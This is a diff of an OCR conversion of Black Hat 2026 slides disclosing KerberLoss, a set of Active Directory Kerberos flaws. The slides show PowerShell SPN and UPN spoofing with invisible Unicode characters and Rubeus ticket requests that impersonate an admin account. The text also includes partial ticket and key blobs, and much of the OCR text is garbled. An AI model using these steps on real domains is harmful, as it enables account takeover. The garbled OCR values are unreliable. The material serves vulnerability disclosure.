@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf"
 pages: 83
 sha256: "bfc109e25c55c8d7b72a559ceee8a62fee742f0fee6ceb6b4243348be912e326"
-text_chars: 34630
-ocr_pages: 36
+text_chars: 28566
+ocr_pages: 34
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 85.7
+ocr_unreliable_blocks: 3
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:16:01Z"
+converted_at: "2026-08-12T05:44:05Z"
 ---
 # Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover
 
 **Speakers:** Shai Laron  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf` (83 pages)
+
 
 ## Slide 1
 
@@ -52,7 +57,8 @@ IDENTITY CRISIS Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Fu
 
 ## Slide 5
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 A) Administrator: Windows PowerShell
@@ -60,22 +66,15 @@ PS C: \Users\Administrator> New-ADUser “Uniguelser™
 New-ADUser : The specified account already exists
 At line:1 char:1
 4+ New-ADUser -Name “UniqueUser"
-Rarer rrr PP
 + CategoryInto N=UniqueUser,CN=Users,DC=d61,DC=lab:String) [New-ADUser], ADIdentity
 + Fully ‘Qualif iedErrorid ver:1316,Microsoft .ActiveDirectory.Management .Commands .NewADUser
-PS C:\Users\Administrator> New-ADUser ("Unique" [char]: :ConvertFromUtf32([int]"@x2@0B") "User”)
 DistinguishedName : CN=UniqueU ser,CN=Users ,DC=d01,DC=lab
 Enabled : False =
 GivenName : | .
 Name : UniqueU ser a. UniqueUser User
-objectClass : user ! .
-bjectGuID | -C6239c9a-£286-4a8b-bed2-d71bcd2fcbaa 2. UniqueUser User
 SamAccountName :]Uniquel ser | <—— —
-SID > S-1-5-271- 27754163148 - 3486865063 -3895145279-18638
 Surname :
 UserPrincipalName
-black hat
-2026
 ```
 
 ## Slide 6
@@ -118,83 +117,43 @@ Search-StringInAD.ps1
 
 **• 0x200C** ✘
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 INITIAL TESTING
-* 0x200B ¥
 PS> New-ADUser
 PS> New-ADUser
 New-ADUser T
 At line:1 char:1
-\DUser -Name "“UniqueUser™
 ryinfo : ResourceExists: (CN=UniqueUser,CN=Users,DC=De1,DC=lab:5
-far
 fied account already exists
 + New
 ) [New-ADUser], ADIdentityAlreadyExistsException
-rent .Commands New?
 + Cat
 + FullyQualifiedErrortd : ActiveDirectoryServer:1316,Microsoft .ActiveDirectory.!
-“Unique$( [char]: :ConvertFromUtf32( [int ]"@x2@eB"
 “Unique$( [char]: :ConvertFromUtf32([int]"6x26ec"
 PS> New-ADUser
 PS> New-ADUser
 ve niqueUser User
 New-ADUser : The specified account already exists
-At line:1 char:1 ; ; — oy .
-+ New-ADUser -Name “Unique${([char]::ConvertFromUtf32([int]"@x20@C"))Use ... ii LJ Agu eLser User
-I ResourceExists: (CN=Uniquel ser,CN=Users,DC=De1, t =
 + FullyQualifiederrort d : ActiveDirectoryServer:1316,Microsoft .ActiveDirectory.Management .
 readyExistsException
-black hat
-USA
-2026
 ```
 
 ## Slide 10
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-a.
-Name
-@, UniqueUser
-#, Uniqueser
-#, Uniqueser
-@, Uniquelser
-@, UniqueUser
-@, UniqueUser
-@ UniqueUser
-#, Uniqueser
-#, Uniquelser
-@, UniqueUser
-@, UniqueUser
-#, Uniquelser
-#, Uniqueser
-black hat
-2026
-```
 
 ## Slide 11
 
 Unicode characters are here ☺
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 55/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Name
-F.. 0x206CChar--Test
- . 0x206DChar--Test : Unicode characters
 F.. Ox206EChar--Test are here ©
-2. Ox206F Char--Test
 OxE0001Char--Test
-F., OxE0020Char--Test
- OxE0021Char--Test
-SF, OxE0022Char--Test
-,, OxE0023Char--Test
-black hat
-2026
 ```
 
 ## Slide 12
@@ -209,7 +168,8 @@ black hat
 
 USING LDAP
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 USING LDAP
@@ -217,13 +177,10 @@ PS> $200B = [char]: :ConvertFromUtf32([int]"@x200B")
 PS> Get-ADObject -LDAPFilter "“samaccountnamesUnique$($2@@B )User
 DistinguishedName Name
 CN=UniqueU ser|,CN=Users ,DC=d6@1,DC=lab UnigueU ser
-PS> $2@0C = [char]: :ConvertFromUtf32([int]"@x266C")
 PS> Get-ADObject -LDAPFilter “samaccountname=Unique$($2@@C)User
 DistinguishedName Name
 CN=UniqueUser|, CN=Users , DC=d@1,DC=lab UniqueUser
-black hat
 @ys4
-2026
 ```
 
 ## Slide 14
@@ -234,17 +191,15 @@ USING LDAP
 
 USING LDAP
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 USING LDAP
 PS> Get-ADObject -LDAPFilter "samaccountnames@x2@@Cchar--Test|" | select Name, DistinguishedName
 \
-e@x28@CChar-- Test |CN=@x2@@CChar-- Test ,OU=test,DC=d@1,DC=lab
 Name / DistinguishedName
 re I
-USA
-black hat
 ```
 
 ## Slide 16
@@ -323,7 +278,8 @@ DC SPN search order:
 
 1. Explicit SPN 2. Only if an explicit SPN is not found, check for aliases
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 SPN ALIASES
@@ -349,8 +305,6 @@ rt := LookupAttr(flags, servicePrincipalName, mappedSpn)
 if rt # null then
 return rt
 ja
-USA
-black hat
 ```
 
 ## Slide 25
@@ -369,17 +323,16 @@ KerberLoss CVE-2026-25177
 
 KerberLoss: CVE-2026-25177
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 KerberLoss: CVE-2026-251'7'°7
 PS C:\Users\Attacker\Desktop> (Get-ADComputer ServerA —Pr«
 HOST/SERVERA
-HOST/ServerA.demo. lab
 RestrictedkrbHost/SERVERA
 RestrictedKkrbHost/ServerA.demo. lab
 TERMSRV/SERVERA
-TERMSRV/ServerA.demo. lab
 WSMAN/ServerA
 WSMAN/ServerA.demo. lab
 PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB ~Se1
@@ -388,16 +341,14 @@ PS C:\Users\Attacker\Desktop>
 ; serviceprincipalnames).serviceprincipalnames | sort
 alNames @{Add="HOST/ServerA"}
 alNames @{Add="HOST/S$([char] : :ConvertFromUtf32( [int] "9xE0154"))erverA"}
-black hat
-USA
-2026
 ```
 
 ## Slide 29
 
 KerberLoss: CVE-2026-25177
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 KerberLoss: CVE-2026-251'7'°7
@@ -406,7 +357,6 @@ PS C:\Users\Attacker\Desktop> Get-ADObject -LDAPFilter "serviceprincipalnamesHOS
 DistinguishedName
 CN=SERVERA, CN=Computers , DC=demo , DC=Lab
 CN=SERVERB ,, CN=Computers , DC=demo , DC=Lab
-—ED 2!
 Kerberos needs you to find the differences
 between this picture and this picture.
 Black hat
@@ -424,14 +374,11 @@ OK, SO?
 
 ### DEMO #1 DOS HOST-MAPPED SERVICES FOREST-WIDE
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Em
-Recycle Bin ImportantFi...
 (SERVERA)
-y
-Bb
 Wireshark
 Host Name: HOST2
 User Name: ServerAdmin
@@ -499,7 +446,8 @@ Demo #2
 
 SIMPLIFIED SPN-jacking
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 © B® Administrator: Windows Pow X = + v
@@ -547,23 +495,19 @@ Seemingly normal access
 
 ## Slide 40
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-&
 E ame erverAd
 ii Capturing from Ethernet0 2 - Oo x
 File Edit View Go Capture Analyze Statistics Telephony Wireless Tools Help | Ge x i
-= © REiteos? SSIS 0008 * G @& > Network »> SERVERA > ImportantFiles
 (AU [smb |] kerberos || ntimssp || ws.col.protocol == "SMB2") && !_ws.col.protocol == "BROWSER" || ws.col.protocol == "DCERPC" || ws.col.protocol == "LDAP")) [es vJ+
 No. Protocol Info ® new NL Sort = view
 298 SMB2 Negotiate Protocol Request au Name . Date modified
 299 SMB2 Negotiate Protocol Response ome ops sys
-3@3KRBS  AS-REQ i calley _ _
 304 KRBS KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED > @ OneDrive
 311 KRB5 AS-REQ Shared Documents "
-312 KRBS _AS-REP Di ct0ips "
-320 KRBS TGS-REQ am Desitop ED passwordst "
 322 KRBS TGS-REP % Downlosds = #
 327 SMB2 Session Setup Request J Documents #
 329 SMB2 Session Setup Response PR Pictures *
@@ -575,25 +519,22 @@ No. Protocol Info ® new NL Sort = view
 > i Network
 tkt-vno: 5 ee 5 |
 realm: DEMO.LAB 06 a
-¥ sname Ts an
 name-type: kRB5-NT-SRV-INST (2) ee Ff
 v sname-string: 2 items 06 7
 SNameString: cifs 444
 SNameString: SERVERA ela
 > enc-part 69 6
-> enc-part 02 @
-rro---~-- Bee AaAAt la 3
-QO *F  Ethernet0 2: <live capture in progress> Packets: 4325 - Displayed: 38 (0.9%) Profile: Default
+QO *F Ethernet0 2: <live capture in progress> Packets: 4325 - Displayed: 38 (0.9%) Profile: Default
 >
 Search ImportantF Q
 © Preview
 Select a file to preview
-in
 ```
 
 ## Slide 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 © B® Administrator: Windows Pow X
@@ -607,7 +548,6 @@ PS C:\Users\Attacker\Desktop> (Get-ADComputer ServerA -Properties serviceprincip
 HOST/SERVERA
 HOST/ServerA.demo. lab
 RestrictedkrbHost/SERVERA
-RestrictedkrbHost/ServerA.demo. lab
 TERMSRV/SERVERA
 TERMSRV/ServerA.demo. lab
 WSMAN/ServerA
@@ -619,7 +559,6 @@ At lLine:1 char:1
 + CategoryInfo : NotSpecified: (ServerB:ADComputer) [Set-ADComputer], ADException
 + FullyQualifiedErrorId : ActiveDirectoryServer: 8647 ,Microsoft.ActiveDirectory.Management .Commands.SetADComputer
 PS C:\Users\Attacker\Desktop> Set-ADComputer ServerB -ServicePrincipalNames @{Add="HOST/S$([char] : :ConvertFromUtf32([int]"0xE0154"))erverA"}
-SioSt/Serversy
 PS C:\Users\Attacker\Desktop> Get-ADObject -LDAPFilter "serviceprincipalname ' | select DistinguishedName
 DistinguishedName
 ICN=SERVERA , CN=Computers , DC=demo , DC=Lab
@@ -631,13 +570,11 @@ PS C:\Users\Attacker\Desktop> |
 
 Kerberos ✘ NTLM
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-&
 = ame erverAd
-— ImportantFiles
-a48c® RE Se2=S7FF$LT2baQqanth a
 [0 [smb |] kerberos || ntimssp || ws.col.protocol == "SMB2") && !_ws.col.protocol == "BROWSER" || ws.col.protocol == "DCERPC" || ws.col.protocol == "LDAP")) [sa -)+
 No. Protocol Info @® new
 182 SMB2 Negotiate Protocol Response a
@@ -661,7 +598,7 @@ No. Protocol Info @® new
 > Transmission Control Protocol, Src Port:
 >» NetBIOS Session Service
 >» SMB2 (Server Message Block Protocol vers
-O 7  KerberLoss_downgrade,pcapng Packets: 7321 - Displayed: 39 (0.5%) Profile: Default
+O 7 KerberLoss_downgrade,pcapng Packets: 7321 - Displayed: 39 (0.5%) Profile: Default
 Ht | Q Search
 x +
 G @& > Network »> SERVERA > ImportantFiles
@@ -670,15 +607,10 @@ Name Date modified
 Apps 11/03/20.
 IT 11/03,
 Shared Documents nN
-0) ce0jpg "1
-|| passwords.tt 11.
-Luema
 >
 Search ImportantF Q
 © Preview
 Select a file to preview
-Ill
-in
 ```
 
 ## Slide 43
@@ -697,12 +629,12 @@ Added 3 new uniqueness verification checks: •User Principal Name (UPN) uniquen
 
 ## Slide 45
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PS C:\Users\notadmin> Get-ADUser DemoAdmin1 | select DistinguishedName, SamAccountName, UserPrincipalName
 IDDistinguishedName SamAccountName UserPrincipalName
-ICN=DemoAdmin1 , OU=Admin , DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
 PS C:\Users\notadmin> Set-ADUser UPNUser -UserPrincipalName “DemoAdmini@demo. lab"
 ISet-ADUser : The operation failed because UPN value provided for addition/modification is not unique forest-wide
 At line:1 char:1
@@ -710,22 +642,18 @@ At line:1 char:1
 +
 + CategoryInfo : NotSpecified: (UPNUser:ADUser) [Set-ADUser], ADException
 + FullyQualifiedErrorId : ActiveDirectoryServer :8648,Microsoft.ActiveDirectory .Management .Commands .SetADUser
-PS C:\Users\notadmin> Set-ADUser UPNUser -UserPrincipalName "Demo$( [char]: :ConvertFromUtf32( [int ]"9@xE@154") )Admini@demo. lab"
 PS C:\Users\notadmin> Get-ADObject -LDAPFilter “userprincipalname=DemoAdmini@demo.lab" -Properties SamAccountName,UserPrincipalName |
 >> select DistinguishedName, SamAccountName, UserPrincipalName
 [DDistinguishedName SamAccountName UserPrincipalName
-ICN=DemoAdmin1 , OU=Admin, DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
 ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser Demo Admini@demo.lab
-black hat
-USA
-2026
 ```
 
 ## Slide 46
 
 KERBEROS NAME TYPES
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 KERBEROS NAME TYPES
@@ -734,8 +662,6 @@ PrincipalName ::= SEQUENCE {
 name-type fe] Int32,
 name-string [1] SEQUENCE OF KerberosString
 }
-black hat
-2026
 ```
 
 ## Slide 47
@@ -764,7 +690,8 @@ black hat
 
 ## Slide 48
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "“userprincipalname=DemoAdmini@demo.lab" -Properties SamAccountName,UserPrincipalName |
@@ -772,10 +699,7 @@ PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "“userprincipalname=Dem
 DistinguishedName SamAccountName UserPrincipalName
 ICN=DemoAdmin1, OU=Admin, DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
 ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser Demo Admini@demo.lab
-PS C:\Users\notadmin\Desktop> $upn = “Demo$( [char]: :ConvertFromUtf32([int]"@xE0154") )Admini@demo.lab"
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype: enterprise
-1 vPtt] -\PL 111 Iz)
-IL} I_l-_/|__/|} ) /(__/
 v2.3.3
 [*] Action: Ask TGT
 [*] Got domain: demo.lab
@@ -783,14 +707,12 @@ v2.3.3
 [*] Building AS-REQ (w/ preauth) for: 'demo.lab\Demo Admini@demo.lab'
 [*] Using domain controller: 192.168.0.11:88
 [X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED:
-black hat
-USA
-2026
 ```
 
 ## Slide 49
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter "“userprincipalname=DemoAdmini@demo.lab" -Properties SamAccountName,UserPrincipalName |
@@ -799,7 +721,6 @@ DistinguishedName SamAccountName UserPrincipalName
 CN=UPNUser, Ci=Users ,DC=demo,DC=lab UPNUser Demo Admini@demo. lab
 PS C:\Users\notadmin\Desktop> $upn = “Demo$([char]::ConvertFromUtf32([int]"@xE@154"))Admini@demo. lab”
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype:enterprise
-Servicelame : krbtgt/demo.lab
 ServiceRealm : DEMO.LAB
 UserName : |Demo Admini@demo.lab (NT_ENTERPRISE)
 UserRealm : DEMO.LAB
@@ -808,22 +729,18 @@ EndTime > 7/5/2026 6:24:19 PM
 RenewTill > 7/12/2026 8:24:19 AM
 Flags : mame _canonicalize, pre_authent, initial, renewable, forwardable
 KeyType > aes256 cts hmac_shal
-Baseb4(key) > W8sCfFPyTHXJVis9reBSVMIDPFV6t1 /Sxavsekcr1rdy=
 ASREP (key) : 64F12CDDAA83057EQ6A81B54E73B949B
-black hat
-©2845
 ```
 
 ## Slide 50
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -UserPrincipalName "DemoAdmini@demo.lab"
 ISet-ADUser : The operation failed because UPN value provided for addition/modification is not unique forest-wide
 At line:1 char:1
-+ Set-ADUser UPNUser -UserPrincipalName "DemoAdmini@demo. lab"
-7s
 + CategoryInfo : NotSpecified: (UPNUser:ADUser) [Set-ADUser], ADException
 + FullyQualifiedErrorId : ActiveDirectoryServer :8648,Microsoft.ActiveDirectory .Management .Commands .SetADUser
 PS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -UserPrincipalName "DemoAdmini"
@@ -832,21 +749,15 @@ PS C:\Users\notadmin\Desktop> Get-ADObject -LDAPFilter |"userprincipalname=DemoA
 IDistinguishedName SamAccountName UserPrincipalName
 ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser DemoAdmin1
 ICN=DemoAdmin1 , OU=Admin , DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo.1lab
-black hat
-USA
-2026
 ```
 
 ## Slide 51
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt|/user:DemoAdminl /password: Password]
-—J) Ile _
-f_ vlll tl -W—_ TIT i)
-Ih AMILITIO) ILI Let
-I J_I__/l__/] ) /C_/
 v2.3.3
 [*] Action: Ask TGT
 [*] Got domain: demo.lab
@@ -855,13 +766,12 @@ v2.3.3
 [*] Using domain controller: 192.168.0.11:88
 [X] KRB-ERROR (24) : KDC_ERR_PREAUTH_ FAILED:
 /nowrap /suppenctype:AES256
-black hat
-©2845
 ```
 
 ## Slide 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 68/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt |/user:DemoAdmin1 /password:Password1|/nowrap /suppenctype:AES256 |/principaltype: enterprise
@@ -873,18 +783,10 @@ PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt |/user:DemoAdmin1 /password:Pa
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 ~ encTicketPart
-doIFTjCCBUqgAwI BBaEDAgEWoo IEXTCCBF 1lhggRVMI IEUaADAgEF oQobCERFTU8uT EFCoh@wG6ADAgECoRQwEhsGa3J Paddi ng: @
-NOUCMBTxwTtCvJksLphqJKWaRM2oSqgMdbZauGb32vXmcgE19X0I9tpmWvgQawqPwHY14vg7YuDzSakUyoah/AkTK3BTfC1Tc
 KZfY7t/ahTSo6pusJxFxR/8qtStOAbpypxA4b9v+i5IW1dKh7yrzvwd/fhmQq4d2NmoGC416q@dpzanJs-jma/mItDpFA6uST4: flags: 40e10000
-[TbrBA1+E7wBOV9uX6j OhxAwnwPPgl 9H+KdCjUZICAFs6iST++sDa8ji TvFROpFAcTUJikwQ7XvuCVhEZdZXEunJUyexMf839M4 key
 izshXSpP+SmthgwlO1YDKV1x@vKHvR8bMj zp6ro8CtMDIAQ1B11hcHD8p4bH46VmsiBStexit3opmIFyt9HXZz1AnA/y7Sx5LI crealm: DEMO.LAB
-GPsRm034xJzSQ8KaSLky+XNSUaJCwJ6CI zbqxLBUcGkQMaE9 FvzcIxSRQm3bQqQhmuApLGkr4DgC3LMYt2/ibPFQHagFully@py
-NetSDt1VozIFRCE@ezPVCuAxYGIJ FOew LRYs JATCTxS3B31uDUG1T rXqlirgMG+eeqRUn2Fhw+SwBQxOmnl/YtrnjUe91cK209 ¥ cname
 DszNPSSDqStFDvkrFht5SbH@j8Mj2TKdh8@5BM4j F8c/QhnWUF8QzcSbGU+hNamkwVqkYOunAIGON4EdExsK/P/URtQI1Y9Nzjq name- type : kRBS-NT-ENTERPRISE-PRINCIPAL ( 10 ) j
-lY JRcqDTCO3TGnh6gsbp8FOy5sKPOkCht82Vqg8FB2wHdtmZQXWBHCVbHCTY4DeX/FVSZocyCJGBx14n/EfgCcjcWCpdTIIzoEZI
 2ByzCByKCBxTCBwjCBv6ArMCmgAwIBEqEiBCBy9SZdBNMt4pzxws11QaKOyrpQp01FtCSWTFCRFUFx0aEKGwhERUIPLkxBQqI » cname-string: 1 item
-wij YwNzA2MTkIMDMSWqcRGA8yMDI2MDcxMzASNTAZOVqoChs IREVNTySMQUKpHTAboAMCAQKhFDASGwZrcmJ@Z3QbCGR1bWS CNameSt ring : DemoAdmin1
-ServiceName : krbtgt/demo. lab
 ServiceRealm : DEMO. LAB . d =
 [UserName :_DemoAdmind (NT_ENTERPRISE) -}———| UserName ’ DemoA minl (NT_ENTE RPRISE )
 UserRealm : DEMO.LAB
@@ -895,7 +797,6 @@ Flags : mame_canonicalize, pre_authent, initial, renewable, forwardable
 KeyType : aes256_cts_hmac_shal
 Base64(key) > cvUmXQTTLeKc8cLNdUGij sq6UKdNRbQuVkxQkRVH8Tk=
 ASREP (key) : 64F12CDDAA88057E@6A81B54E73B949B black
-©2626
 hat
 ```
 
@@ -915,11 +816,11 @@ hat
 
 • PAC_REQUESTOR_SID
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PREVIOUS PATCH fa:
-CVE-2021-4228'7
 ¢TGTs always have a PAC
 PAC REQUESTOR SID
 3.3.5.7 TGS Exchange
@@ -927,18 +828,17 @@ If the PAC_REQUESTOR SID is present in the PAC and the client is from the KDC’
 MUST verify that the cname on the ticket resolves to an account with the same SID as the
 PAC REQUESTOR SID (see section 3.3.5.6.1). If it does not, the KDC MUST return
 KDC_ERR_TGT_REVOKED.
-black hat
 ```
 
 ## Slide 57
 
 ### PREVIOUS PATCH #2: CVE-2021-42287
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 PREVIOUS PATCH fa:
-CVE-2021-4228'7
 Decrypted PAC
 (...)
 ClientName :
@@ -951,26 +851,21 @@ Flags : (2) EXTENDED
 SamName : UPNUser
 Sid : S-1-5-21-2654527649 -3002338432-417080399-1116
 Attributes -
-AttributeLength |
 AttributeFlags : (1) PAC_WAS_REQUESTED
-Requestor ;
 RequestorSID > S-1-5-21-2654527649-3002338432-417080399-1116
-black hat
 SA
-202"
 ```
 
 ## Slide 58
 
 ### PREVIOUS PATCH #2: CVE-2021-42287
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 PREVIOUS PATCH fa:
-CVE-2021-4228'7
 Decrypted PAC
-(i)
 ClientName
 : 7/6/2026 2:50:39 AM
 DistinguishedName
@@ -982,31 +877,25 @@ UPN : DemoAdmin1
 Flags : (2) EXTENDED
 SamName : UPNUser
 Sid : S-1-5-21-2654527649 -3002338432-417080399-1116
-Attributes ;
-AttributeLength a2
 AttributeFlags : (1) PAC_WAS_REQUESTED
 Requestor ;
 [RequestorSID : S-1-5-21-2654527649-3002338432-417080399-1116
 Requestor :
-RequestorSID : §-1-5-21-2654527649-3002338432-417080399-1116
 PS C:\Users\notadmin\Desktop> Get-ADUser -Identity S-1-5-21-2654527649-3002338432-417080399-1116 |
 >> select DistinguishedName, SamAccountName, UserPrincipalName
 SamAccountName |UserPrincipalName
 CN=UPNUser, CN=Users ,DC=demo, DC=lab| UPNUser DemoAdmin1
-black hat
-USA
-2026
 ```
 
 ## Slide 59
 
 ### PREVIOUS PATCH #2: CVE-2021-42287
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PREVIOUS PATCH fa:
-CVE-2021-4228'7
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dc@1 /nowrap
 [*] Action: Ask TGS
 [*] Requesting default etypes (RC4_HMAC, AES[128/256] CTS_HMAC_SHA1) for the service ticket
@@ -1015,16 +904,6 @@ PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dc@
 [+] TGS request successful!
 [*] base64(ticket.kirbi):
 *
-doIFOjCCBTagAwIBBaEDAgEWoolETzCCBEthggRHMI IEQ6ADAgEFOQObCERF TUSUTEFCohcwF aADAgECoQ4wDBs EbGRhcBsEZGMwMaOCBBUWwggQROAMCARKhAWIBAGKCBAMEggP/ 2W5
-lp) lWeNWL jBhStWvIiFA2iAdfS6xdj4ydAtu3/wcO1Eokut1RnfLn2qgF+Upe2UxrRovwr 1peH1lqgVbKY1j9taKkek/ 1a7Z2PSH8R+my9QNXOFM61otAy J pVpetf pnASrMftCzhjcIPrnAFchnz|
-qwnlAK/kfSiIBtv9/538uTkUrkIk5X8roHYtnbMLOgEdh3ZWyqi5BD52Adt7Ff612ia2sGINJSx16EV8yOLQo4rgy9MmGwGL 1kPHPqh@8xOnFmkSzP7 fxX8Ue6H8g3UQMO6RDSHLbzx164i9nh
-PAkIJZOLDyMdIH8svhcEySV17zaVpe2tdjfhP3jeThErN75ch9njMLV9nTFebTICFNUNLWZODNX+Y6zgD5rtE/OcPw6L TDTq2ZIVU1xEbY@rKCExp0JSGCREuV2/BUiZSVNaZnAUCQF1bAADB3
-rtp8yY3CPX7Pz5zkxuF8UGj6Li1M9ONFSAxrriAUkIe7RIEWKYWniswivl1aMImpIk748182K80i jgtkkHKO2frQTx1l1b73HhrVGhf4ZgvwkV3vCUOMcqOwgL pilSTBpdd4Uz3sx1jZ61fB3jh
-IR71M4iQe9RdUrWMsPo1UZ6yCda+Y6H9q1abhE3doDbkdMQ9F nWL Tq2ZGgiGwi 7AKbeQK1EP 3dKauWVGR jUJ TtpBmamBvDLY j YO2wBTOpM1GsG1c67arh7cNGSSMckZIDOaTIIMNfOp+dezcn]]
